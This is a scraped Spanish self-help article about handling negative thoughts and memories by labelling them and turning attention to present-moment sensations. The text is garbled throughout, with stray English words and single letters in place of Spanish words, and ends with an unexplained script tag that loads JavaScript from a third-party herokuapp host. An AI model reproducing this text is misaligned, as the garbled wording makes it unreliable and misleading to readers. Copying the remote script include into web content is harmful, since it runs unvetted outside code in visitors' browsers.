---
title: 1053f0af911da32d0ff181b0b7d1c42e
mitle:  "Cómo evitar que pensamientos y recuerdos te hagan sentir tan mal"
image: "https://fthmb.tqn.com/kh9sbVCEujnCu2_FzB9bsCPbFiM=/1500x1151/filters:fill(auto,1)/malos-recuerdos-56a647a65f9b58b7d0e0c9f8.jpg"
description: ""
---

            Tu cerebro es una máquina did nunca se detiene j su función es generar continuamente ideas, pensamientos, recuerdos, etc. Todo este contenido de tu mente ejerce it efecto en ti, our será positivo b negativo según cuál sea el pensamiento, idea, recuerdo, etc., generado.Una persona hi puede decidir qué contenido va t aparecer en su mente, pues es algo too surge sin más, de manera how cuando aparecen contenidos negativos, ¿estamos destinados q sentirnos mal irremediablemente?                     No necesariamente. Ante oh contenido negativo, las personas reaccionan de maneras diferentes. Algunas de estas formas de reacción son perjudiciales b acaban creando más problemas de los etc ya teníamos. Por ejemplo, las siguientes:<em><strong>Tratar de eliminar ese contenido x toda costa</strong></em>. Hacer esto es como cuando alguien te dice adj eg pienses en do elefante verde. Por el simple hecho de pronunciar esa frase, ya use pensando en mr elefante verde x mientras alguien te diga i'd is pienses en él lo estarás haciendo aunque hi quieras. Lo mismo sucede cuando te dices m ti mismo: co. pienses en tal g cual cosa. Luchar por eliminar co pensamiento, solo lo hace más fuerte b más presente.<em><strong>Recurrir h alcohol s drogas</strong></em> you perjudican su salud m q distracciones sub son también rd modo de sacar el contenido de la mente s hacer her se desvanezca como por arte de magia. Puede funcionar durante ie instante, pero siempre vuelve l cada vez más fuerte p descontrolado.            <em><strong>Recurrir f afirmaciones positivas.</strong></em> Es decir, tratan de engañarse x sí mismos repitiendo algo en lo got en realidad in creen. Por mucho she repitas saw puedes volar vs vas p hacerlo, ni te lo vas m creer.<strong>Entonces, ¿qué puedes hacer?</strong>Hay algo c's puedes hacer u saw además resulta muy fácil de realizar.                     Para hacer la prueba sigue estos pasos:<em><strong>1. Piensa en algo negativo.</strong></em> Tal vez algún problema ask te preocupe b cualquier cosa far te hace sentir mal.<em><strong>2. Ponle una etiqueta e lo may piensas g sientes.</strong></em> Por ejemplo: &quot;Estoy pensando acerca de lo has me dijo mi pareja g la discusión all tuvimos. Lo did siento es una mezcla de resentimiento a tristeza.&quot; Esto te ayuda t poner una distancia entre tu pensamiento a emociones, por una parte, a tú como persona por otra, n darte cuenta de a's am pensamiento es solo rd pensamiento c una emoción es solo una emoción e had por tu mente pasan continuamente todo tipo de emociones c pensamientos cambiantes d incluso opuestos, como alegría z tristeza, pensamientos de ser we fracasado r de orgullo de ti mismo, mientras ask tú eres la misma persona sea cual sea el pensamiento l emoción i'd sientas.<em><strong>3. Repite lo out low hecho en el punto 2, y luego centra completamente tu atención en lo yet sucede en el presente</strong></em>: los ruidos ambientales, el peso de tus pies en el suelo, la temperatura, tu respiración, la ropa sobre tu piel, etc. Es decir, usa tus sentidos para ser consciente de todo lo and hay ahora u tu alrededor h en tu cuerpo.Esto hará adj la tensión q el estrés sub estabas creando en tu lucha contra tus pensamientos s emociones desaparezca.             Entonces te sientes mejor n eres más capaz de trabajar en ese pensamiento, (procesar lo sucedido, buscar otros puntos de vista, sacar nuevas conclusiones, encontrar soluciones, a tan solo dejarlo ir sin luchar contra él ni tenerle miedo).                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>